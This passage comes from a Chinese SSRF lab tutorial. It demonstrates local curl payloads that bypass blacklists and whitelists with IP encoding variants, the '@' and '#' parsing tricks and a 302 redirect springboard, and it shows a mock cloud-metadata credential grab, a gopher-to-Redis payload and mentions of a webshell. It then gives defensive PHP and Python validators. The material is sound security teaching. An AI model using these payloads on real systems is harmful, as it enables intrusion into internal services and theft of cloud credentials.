curl -s --noproxy '*' 'http://127.0.0.1:9003/?url=http://user@0x7F000003:9001/'
```

输出：

```
[blocked] 黑名单命中: 127.
```

```
[blocked] 黑名单命中: 127.
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

```
[fetch error] Failed to connect to ::1 port 9001 after 0 ms: Could not connect to server
```

```
[blocked] 黑名单命中: localhost
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

八条结果汇总成对照表：

| URL 里的写法 | 解析到的地址 | 结果 |
| ---- | ---- | ---- |
| `127.0.0.3` | 127.0.0.3 | 黑名单拦下（字样命中） |
| `127.3` | 127.0.0.3（短写，缺的段补零） | 黑名单拦下（`127.` 命中） |
| `0x7F000003` | 127.0.0.3（十六进制） | ==通过，后台内容回显== |
| `2130706435` | 127.0.0.3（三十二位整数） | ==通过，后台内容回显== |
| `0177.0.0.3` | 127.0.0.3（首段八进制） | ==通过，后台内容回显== |
| `[::1]` | ::1（IPv6 环回） | 连接拒绝——另一个地址族，后台没绑在这个地址 |
| `localhost` | 127.0.0.1 | 黑名单拦下（localhost 命中） |
| `user@0x7F000003` | 127.0.0.3（user 是用户信息） | ==通过，后台内容回显== |

三种进制变体指向同一个 `127.0.0.3`，验证：`127 × 2^24 + 3 = 2130706435`。变体的本质是==黑名单在字符串层面做匹配、连接在地址层面发生，两个层面之间隔着一次解析==——凡是你能找到"解析前是安全的字符串、解析后是内网地址"的写法，黑名单就形同虚设。

### 6.2 URL 解析歧义：userinfo 与 fragment

URL 标准里，`//` 之后、第一个 `/` 之前是"authority"段，它可以写成 `用户信息@主机:端口`；`#` 之后是 fragment，永不发往服务器。==标准解析器与字符串匹配对同一条 URL 的理解可以完全不同==。用 parse_view.py 把三种理解并排放：

```python
# parse_view.py —— 同一个 URL 在"标准解析"与两种常见"字符串判断"下的样子
from urllib.parse import urlsplit

urls = [
    "http://127.0.0.3:9001/",
    "http://trusted.example@127.0.0.3:9001/",
    "http://127.0.0.3:9001/#http://trusted.example",
]
for u in urls:
    s = urlsplit(u)
    print(u)
    print("  urlsplit().hostname :", s.hostname)
    print("  naive //到/ 一段    :", u.split("/")[2])
    print("  字符串包含 trusted  :", "trusted.example" in u)
    print()
```

```bash
cd ~/labs/w10 && python3 parse_view.py
```

输出：

```
http://127.0.0.3:9001/
  urlsplit().hostname : 127.0.0.3
  naive //到/ 一段    : 127.0.0.3:9001
  字符串包含 trusted  : False

http://trusted.example@127.0.0.3:9001/
  urlsplit().hostname : 127.0.0.3
  naive //到/ 一段    : trusted.example@127.0.0.3:9001
  字符串包含 trusted  : True

http://127.0.0.3:9001/#http://trusted.example
  urlsplit().hostname : 127.0.0.3
  naive //到/ 一段    : 127.0.0.3:9001
  字符串包含 trusted  : True
```

后两行：标准解析的 `hostname` 都是 `127.0.0.3`，而字符串判断全部认为"这个 URL 是可信域名的"。白名单靶 `white.php`（规则：URL 必须含 `trusted.example`）挨个验证：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9003/white.php?url=http://trusted.example/page'
curl -s --noproxy '*' 'http://127.0.0.1:9003/white.php?url=http://trusted.example@127.0.0.3:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9003/white.php?url=http://127.0.0.3:9001/%23http://trusted.example'
```

输出：

```
[fetch error] Could not resolve host: trusted.example
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

第一条说明白名单放行的确实只有"含字样"的 URL——`trusted.example` 解析不了，请求照发。后两条把连接目的地偷换成内网地址，白名单毫无察觉。`@` 形态的语义是"以 trusted.example 的身份连接 127.0.0.3"——cURL 只看 `@` 后面的主机；`#` 形态里 fragment 被服务端丢弃，但字符串匹配发生在此之前。

> [!warning] payload 里的 `#` 要写 `%23`
> `#` 在 URL 里有特殊语义，==外层请求里的裸 `#` 会把后面的内容整个截成 fragment==，curl 根本不发给靶。上面第三条命令写的是 `%23`——传到服务端由 PHP 解码回 `#`。`&` 同理（查询串分隔符），放不进 `--data-urlencode` 的手工拼接 payload 里都要先编码。

### 6.3 302 跳转：让过滤器看不到真正的目的地

字符串匹配只看第一跳的 URL。若预览服务开了自动跟随跳转（主靶的 `CURLOPT_FOLLOWLOCATION => true`），==一个过滤器没拦下的地址可以借 302 把请求带到任何地方==。9030 是"攻击者的跳板"：任何到达它的请求都收到 302，`Location` 指向内网后台。先看跳板本体：

```bash
curl -s -i --noproxy '*' 'http://127.0.0.1:9030/go' | head -4
```

输出：

```
HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.14.4
Date: Fri, 23 Oct 2026 15:26:43 GMT
Location: http://127.0.0.3:9001/
```

跳板地址里没有内网痕迹，打黑名单靶（跳板走本机 eth0 地址，绕开一切 `127` 字样）：

```bash
IP=$(hostname -I | awk '{print $1}')
curl -s --noproxy '*' "http://127.0.0.1:9003/?url=http://$IP:9030/go"
```

输出：

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

黑名单放行了第一跳，第二跳替攻击者完成了内网访问。跳转能借的不止 http——试一下把 `Location` 写成 `file://` 与 `gopher://`：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode "url=http://127.0.0.1:9030/jump?to=file:///etc/passwd"
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode "url=http://127.0.0.1:9030/jump?to=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25244%250D%250APING%250D%250A"
```

输出：

```
[fetch error] Protocol "file" disabled (in redirect)
```

```
[fetch error] Protocol "gopher" disabled (in redirect)
```

当代 cURL 在跟随跳转时只允许 http/https/ftp 一族，==协议降级跳转被默认封死==。urllib 版做同样实验：http 跳转照常跟随（内网内容一样带出），`file://` 跳转同样被拒：

```bash
IP=$(hostname -I | awk '{print $1}')
curl -s --noproxy '*' "http://127.0.0.1:9005/?url=http://$IP:9030/go"
curl -s --noproxy '*' "http://127.0.0.1:9005/?url=http://127.0.0.1:9030/jump?to=file:///etc/passwd"
```

输出：

```
<h1>INTERNAL ADMIN PANEL</h1>
<pre>super_secret_flag{ssrf_reached_intranet}</pre>
```

```
[fetch error] HTTP Error 302: Found - Redirection to url 'file:///etc/passwd' is not allowed
```

302 绕过的适用边界由此清晰：==跳转绕的是"只检查第一跳"的过滤，不是协议边界==；老题解里"302 跳 file:// 读文件"的打法只属于没有重定向协议限制的老版本库。

### 6.4 DNS rebinding：两次解析之间换地址

域名解析给了过滤一个可乘的时间窗。攻击者持有一个域名 `rebind.attacker`，DNS 服务器把它配置成极短 TTL，并让两次查询返回不同答案：第一次返回公网地址（比如攻击者自己的服务器，`1.2.3.4`），第二次返回 `127.0.0.3`。防御代码的常规流程是"先解析、检查 IP、再连接"——==解析与连接是两次独立的查询==：检查时拿到 `1.2.3.4`，白名单通过；连接时 TTL 已过，再查一次，拿到 `127.0.0.3`，请求落进内网。这类绕过不依赖任何过滤写错，它利用的是"检查结果"与"连接行为"没有绑定这个结构性缺口。修法直接指向缺口本身：==校验时把解析出的 IP 钉死，连接时直接用这个 IP==（第 8 节的 `CURLOPT_RESOLVE`）。本地不复现完整链路（需要可控的权威 DNS），理解"两次解析"这个时间窗即可。

## 7. 云元数据：SSRF 的头号高危目标

前三节打的是"自建靶里的内网"。真实世界中最著名的 SSRF 目标不在企业内网，而在每台云主机自己的地址上：==`http://169.254.169.254`==。它是链路本地地址（link-local，`169.254.0.0/16`），不经路由、只在本机网络内可达——设计初衷是主机与云平台的私有通道。云平台通过它向主机暴露一份"元数据服务"（IMDS，Instance Metadata Service）：主机名、实例型号、启动脚本（user-data），以及最关键的一项——==这台主机绑定的云 API 凭据==（IAM 角色临时密钥）。应用要访问对象存储、消息队列，靠的就是这份自动下发的凭据；它对主机内进程免认证、对网络内其他主机不可达。

==SSRF 把"不可达"变成了"可达"==：攻击者让服务器访问 `169.254.169.254` 时，请求从主机内部发出，恰好命中这条通道；响应里有临时密钥。拿到密钥就能以该主机的云身份调 API——读存储桶、起停实例、横向到更多主机。一次普通 SSRF 就地升级为云账号失陷，这就是 SSRF 在云环境里被列为高危的原因。

`169.254.169.254` 只对本机可达，真实云上的实例也不该去碰——演示用 9040 的 meta_mock.py 架一个"返回结构与 IMDS 完全一致"的本地服务，走一遍请求路径。==注意内容全部是教学假值==（密钥取自 AWS 文档的公开示例），真实云上的响应只会比这更敏感：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.1:9040/latest/meta-data/'
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.1:9040/latest/meta-data/instance-id'
curl -s --noproxy '*' -G 'http://127.0.0.1:9000/' --data-urlencode 'url=http://127.0.0.1:9040/latest/meta-data/iam/security-credentials/webapp-role'
```

输出：

```
ami-id
instance-id
iam/security-credentials/
```

```
i-0abcdef0123456789
```

```
{"Code": "Success", "LastUpdated": "2026-10-23T00:00:00Z", "Type": "AWS-HMAC-S4", "AccessKeyId": "AKIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "Token": "MQo5bGt1...session-token-truncated", "Expiration": "2026-10-23T06:00:00Z"}
```

三步走：先列目录找入口（IMDS 是个简单的目录树，`latest/meta-data/` 下逐级列出可用项），读实例标识，最后取凭据文档——`AccessKeyId`、`SecretAccessKey`、`Token` 三件套就是该主机云身份的全部材料。

> [!info]- 盾的一侧：IMDSv2
> 云厂商的对策是把"取凭据"从一次 GET 升级成两步会话：先向固定路径发一个 `PUT` 请求换取会话令牌，再带着令牌头去 GET 元数据——这就是 IMDSv2。它能挡住两类攻击：不跟随跳转的简单 SSRF（PUT 那步发不出去）与配置错误放出去的反弹连接。它挡不住能自定义请求方法与头部的 SSRF——gopher 伪造的报文里 PUT 与头部俱全（3.4 的报文伪造能力完全覆盖这两步）。另一层盾是跳数限制：IMDS 的响应 TTL 设为 1，经容器、代理转发一跳即失效。云上判 SSRF 危害时，先看目标环境 IMDSv2 覆盖率，再下结论。

## 8. 防御

四层防御按"从源头到兜底"排列，前三层是代码层，第四层是网络层：

**第一层：协议白名单。** 预览服务没有理由接受 `file://`、`gopher://`、`dict://`。发起请求前先取 URL 的 scheme，不在 `http`/`https` 内直接拒绝。==这一层砍掉的是 3.3、3.4 的全部协议能力==，是性价比最高的一道。

**第二层：解析后再校验 IP。** 拿到主机名后先解析成 IP，对 IP 做网段判断——拒绝环回（`127.0.0.0/8`、`::1`）、私网（`10/8`、`172.16/12`、`192.168/16`）、链路本地（`169.254/16`，元数据地址在内）与保留段。校验用==标准解析器的结果==而不是字符串匹配：6.2 的 `@`、`#` 歧义骗的是字符串，骗不过 `urlsplit().hostname`；6.1 的进制变体在"解析成 IP 之后"全部还原成同一个地址。校验通过后==把这组 IP 钉死==，连接时直接使用，DNS rebinding 的两次解析窗口随之消失。

**第三层：不跟随跳转，或逐跳重校验。** 要么关掉自动跟随（`CURLOPT_FOLLOWLOCATION => false`），要么每收到一跳就对新目的地重新走第一、二层——==302 借道的前提是"检查只做一次"==。

**第四层：出网最小化。** 应用服务器不需要访问内网管理段、不需要访问元数据地址时，用网络策略显式禁止：主机防火墙只放行业务依赖的地址段，云环境在安全组与 IAM 侧收紧。代码层总有漏网写法，网络层兜底——==SSRF 危害的上限由"这台服务器还能到哪"决定，把可达面砍小，危害上限跟着降==。

safe_fetch.php 把前三层写成一个可运行的检查器：

```php
<?php
// safe_fetch.php —— 防御示范：协议白名单 + 解析出 IP 后再校验，最后钉住 IP 发请求
function deny(string $reason): void {
    echo "[blocked] {$reason}\n";
    exit;
}
$url = $_GET['url'] ?? '';
$p = parse_url($url);
if ($p === false || !isset($p['scheme'], $p['host'])) {
    deny('无法解析或缺少 scheme/host');
}
if (!in_array($p['scheme'], ['http', 'https'], true)) {
    deny("协议不在白名单: {$p['scheme']}");
}
$host = $p['host'];
if (filter_var($host, FILTER_VALIDATE_IP)) {
    $ip = $host;                        // 本来就是 IP 字面量，无需解析
} else {
    $ip = gethostbyname($host);
    if ($ip === $host) {
        deny("域名解析失败: {$host}");
    }
}
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    deny("解析到内网/保留地址: {$ip}");
}
$port = $p['port'] ?? ($p['scheme'] === 'https' ? 443 : 80);
$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 3,
    CURLOPT_FOLLOWLOCATION => false,    // 不自动跟随；跳转目标要逐跳重新校验
    CURLOPT_RESOLVE        => ["{$p['host']}:{$port}:{$ip}"],   // 钉住已校验的 IP，防 DNS rebinding
]);
$data = curl_exec($ch);
echo $data === false ? "[fetch error] " . curl_error($ch) : $data;
curl_close($ch);
```

把第 3、6、7 节的进攻 payload 逐条打回，看每条停在哪一层检查（9004 端口）：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9004/safe_fetch.php?url=file:///etc/hostname'
curl -s --noproxy '*' 'http://127.0.0.1:9004/safe_fetch.php?url=http://2130706435:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9004/safe_fetch.php?url=http://0x7F000003:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9004/safe_fetch.php?url=dict://127.0.0.1:6379/INFO'
curl -s --noproxy '*' 'http://127.0.0.1:9004/safe_fetch.php?url=http://user@2130706435:9001/'
curl -s --noproxy '*' 'http://127.0.0.1:9004/safe_fetch.php?url=http://example.com/' | head -c 100
```

输出：

```
[blocked] 无法解析或缺少 scheme/host
```

```
[blocked] 解析到内网/保留地址: 127.0.0.3
```

```
[blocked] 域名解析失败: 0x7F000003
```

```
[blocked] 协议不在白名单: dict
```

```
[blocked] 解析到内网/保留地址: 127.0.0.3
```

```
<!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewpor
```

六条结果对应三种拦截路径与一条放行：`file://` 在解析检查就被拦（`parse_url` 对三斜杠 URL 给不出 host）；十进制与 `@` 歧义都活到了 IP 校验层，被 `NO_PRIV_RANGE` 拦下——==进制变体在"解析之后"现出原形==；十六进制写法在 `gethostbyname` 这层就解不开（它不认 `0x` 前缀），被当解析失败拒绝——这条属于顺带拦下，不能当依赖（换一个认 `0x` 的解析函数就漏）；`dict://` 被协议白名单拦下。最后一条正常外网站点完整走通所有检查并取回内容——==防御的目标是把攻击面关掉，不是把功能关掉==。

> [!info]- 同一思路的 Python 参考实现
> `ipaddress` 标准库做网段判断比 `FILTER_FLAG_NO_PRIV_RANGE` 更直观，IP 字面量的处理也天然正确：
>
> ```python
> # safe_check.py —— 防御：解析后再校验。返回 None 表示拒绝，返回 IP 列表表示放行
> import ipaddress
> import socket
> from urllib.parse import urlsplit
>
> BLOCK = [ipaddress.ip_network(n) for n in (
>     "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
>     "169.254.0.0/16", "0.0.0.0/8", "100.64.0.0/10", "::1/128", "fc00::/7", "fe80::/10",
> )]
>
> def check(url):
>     host = urlsplit(url).hostname             # 标准解析：@ 前是 userinfo，# 后是 fragment
>     if not host:
>         return None
>     try:
>         infos = socket.getaddrinfo(host, None)
>     except socket.gaierror:
>         return None
>     ips = sorted({ipaddress.ip_address(i[4][0]) for i in infos})
>     for ip in ips:
>         if any(ip in net for net in BLOCK):
>             return None
>     return ips                                # 校验通过：把这组 IP 钉死，连接时直接用
>
> for u in ("http://127.0.0.1:9001/admin",
>           "http://2130706433:9001/admin",
>           "http://trusted.example@127.0.0.1:9001/admin",
>           "http://127.0.0.1:9001/admin#http://trusted.example",
>           "http://1.1.1.1/"):
>     print(f"{u:52s} -> {check(u)}")
> ```
>
> ```bash
> cd ~/labs/w10 && python3 safe_check.py
> ```
>
> 输出：
>
> ```
> http://127.0.0.1:9001/admin                          -> None
> http://2130706433:9001/admin                         -> None
> http://trusted.example@127.0.0.1:9001/admin          -> None
> http://127.0.0.1:9001/admin#http://trusted.example   -> None
> http://1.1.1.1/                                      -> [IPv4Address('1.1.1.1')]
> ```
>
> 前四条全部拒绝——歧义写法骗不过标准解析，进制变体活不到网段判断之后；第五条合法公网地址放行。`getaddrinfo` 可能返回多个地址（IPv4/IPv6 各一），==逐个校验、全组放行或全组拒绝==，只查第一个地址会漏掉"另一族地址在内网"的变体。

## 9. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| gopher payload 过 `?url=` 报 `URL rejected: Malformed input to a URL function` | 只编码了一层：PHP 剥掉一层后裸控制符进了 cURL。`?url=` 形态要编码两层，直连 curl 形态只要一层（[[#3.4 gopher://：伪造任意 TCP 报文\|3.4]]） |
| gopher 的响应是 `Recv failure: Connection reset by peer`，以为命令失败了 | QUIT 后 Redis 立即关连接，cURL 末次读取撞上 RST，命令已执行。用第二条命令或 `redis-cli` 复核（[[#4.1 未授权读写 key\|4.1]]） |
| `CONFIG SET dir` 报 `can't set protected config` | 受保护配置默认禁改：`enable-protected-configs` 取 `no` 时谁都不能改，`local` 放开本机连接、`yes` 全放开（[[#4.2 从写 key 到写文件：CONFIG SET dir + SAVE\|4.2]]） |
| 从非环回来源连 Redis 被拒 `DENIED Redis is running in protected mode …` | protected-mode 在无密码时拒绝一切非环回来源——这不是故障，是"未授权访问仅内网成立"的原因；SSRF 的环回来源恰好落在放行范围内（[[#4. gopher 打 Redis\|第 4 节]]） |
| `file://etc/passwd` 报 `Bad file:// URL` | 两斜杠形态把 `etc` 当主机名解析；file 路径必须三斜杠起头 `file:///`（[[#3.2 file://：读本地文件\|3.2]]） |
| payload 里的 `#` 让后半段凭空消失 | 裸 `#` 在外层请求里截断查询串，内容根本没发给靶；写成 `%23`，`&` 同理要编码（[[#6.2 URL 解析歧义：userinfo 与 fragment\|6.2]]） |
| 302 跳 `file://` 或 `gopher://` 直接报 `disabled (in redirect)` | 当代 cURL/urllib 跟随跳转时默认只允许 http/https/ftp 一族；302 绕的是"只查第一跳"的过滤，不是协议边界（[[#6.3 302 跳转：让过滤器看不到真正的目的地\|6.3]]） |
| `[::1]` 打不到绑在 `127.0.0.3` 的服务 | IPv4 与 IPv6 环回是两个地址族；`::1` 只到 IPv6 环回，服务绑在哪个族就得用哪个族访问（[[#6.1 IP 变体：同一个地址的不同写法\|6.1]]） |
| urllib 版靶上报 `unknown url type: gopher/dict` | fetcher 决定协议清单：urllib 没有 gopher/dict 处理器，cURL 有。先找代码里的发起函数再选 payload（[[#3.4 gopher://：伪造任意 TCP 报文\|3.4]]） |
| dict 探 Redis 的响应第一行是 `-ERR unknown subcommand 'libcurl'` | cURL 发命令前先发一行 `CLIENT libcurl …` 报身份，Redis 不认；无碍，后续命令照常执行（[[#3.3 dict://：对文本协议服务发命令\|3.3]]） |
| probe 扫描源自己的端口显示超时 | php -S 单线程，处理发给自己的请求会占住到超时；扫描清单里排除扫描源（[[#5. 内网探测自动化\|第 5 节]]） |
| 写出来的 shell.php 里有 `REDIS0012` 和乱码 | SAVE 落的是完整 RDB 格式，webshell 键值在文件后段；PHP 只执行 `<?php` 之后的部分，乱码被原样输出，不影响触发（[[#4.2 从写 key 到写文件：CONFIG SET dir + SAVE\|4.2]]） |
| 十六进制变体被防御代码拦下，但报的是"解析失败" | `gethostbyname` 不认 `0x` 写法，属于顺带拦下而非网段判断的功劳；换一个更宽松的解析路径就漏，防御要靠解析后校验（[[#8. 防御\|第 8 节]]） |

## 10. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **CTFshow Web 入门**与 **BUUCTF** 的 SSRF 分类题（[[01-练习平台索引|01 章]]收录获取方式）：任选两题，先按第 3 节认协议面（发起方是谁、支持哪些协议），再按第 6 节过过滤，把每一步的响应差异记成判读表。至少一题要求用到 gopher 打内网服务。
> 2. **PayloadsAllTheThings 仓库的 SSRF 篇**：对照本章的 IP 变体表，补齐本章没展开的写法（IPv6 变体、畸零短写的更多形态），并给每条写清"解析前的字符串、解析后的地址"两栏。

配套练习：

1. 把主靶 `preview/index.php` 的发起方从 cURL 换成 `file_get_contents($url)`（PHP 流封装），重打第 3 节全部协议，整理一张"cURL 与流封装的协议支持面"对照表；`gopher` 打 Redis 的链路在哪个发起方上还走得通，用输出说明。
2. 给 probe.py 加上端口指纹字典：对判为"开放"的端口自动发 3.4 的 gopher PING，命中 `+PONG` 标记 Redis——把"判活"升级为"认服务"。
3. 用 redis_write.py 的 resp 函数构造一条 `CONFIG GET dir` 的 gopher payload，经预览靶读回 Redis 当前的落盘目录；再设计"改回目录"的还原 payload，把第 4 节的现场清理也做成 gopher。
4. 给 safe_fetch.php 补一个函数：对 `Location` 头逐跳重校验（手动读 30x 响应头、对新 URL 重跑三层检查），用 9030 跳板验证：第一跳放行、跳转目标因指向内网被拦。
5. 防御回归：在第 6 节的黑名单靶上补一条"解析后校验"，重放 6.1 的八条变体，确认全部拦截——体会"字符串匹配"与"解析后校验"的差距。

延伸阅读：

- cURL 手册的 gopher、dict、SMTP/IMAP 各协议条目（curl.se）：每个协议的 URL 语法与 cURL 附加行为（如 gopher 补 CRLF）的权威出处，第 3 节的协议面只是其中常用四个；
- Redis 文档的 Configuration 与 Security 一节（redis.io）：`enable-protected-configs`、`protected-mode` 的完整语义与版本沿革，第 4 节两个开关的出处；
- PortSwigger Web Security Academy 的 Server-side request forgery 词条（portswigger.net）：SSRF 分类（常规/盲打/部分盲打）与防御清单的原始出处；
- 各云厂商的 IMDS 文档（AWS/阿里云/腾讯云均有公开页）：IMDSv2 的令牌会话流程与跳数限制，第 7 节折叠框的扩展阅读；
- 下一站：[[W11-XXE|W11]]——"服务器替你发请求"的另一个入口：实体 SYSTEM 发出的请求之后，站着的同样是本章这套协议面与内网。
